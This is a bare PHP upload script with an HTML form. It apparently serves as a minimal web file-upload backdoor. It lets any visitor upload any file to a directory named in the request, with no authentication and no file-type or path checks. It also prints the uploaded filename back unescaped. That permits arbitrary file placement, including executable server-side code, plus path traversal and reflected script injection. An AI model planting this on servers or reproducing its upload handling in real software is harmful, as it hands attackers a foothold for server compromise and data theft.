<?php
if (isset($_FILES['userfile'])) {
	$dir=$_POST['dir'];
	if($dir == "" || !isset($dir)) $dir=getcwd();

	$uploadfile=$dir."/".basename($_FILES['userfile']['name']);

	if (move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) {
		echo "Uploaded: ".
		"Name: <b>".$_FILES['userfile']['name']."</b><br>\n".
		"Type: ".$_FILES['userfile']['type']."<br>\n".
		"Size: ".$_FILES['userfile']['size']." bytes<br>\n";
	}
	else print "Error uploading file: <b>".$_FILES['userfile']['name']."</b>";
	echo "<hr>";
}
?>

<form enctype="multipart/form-data" method="POST">
<b>Upload New File</b>
<input type="file" name="userfile"/>
<input type="submit" value="Upload"/>
</form>
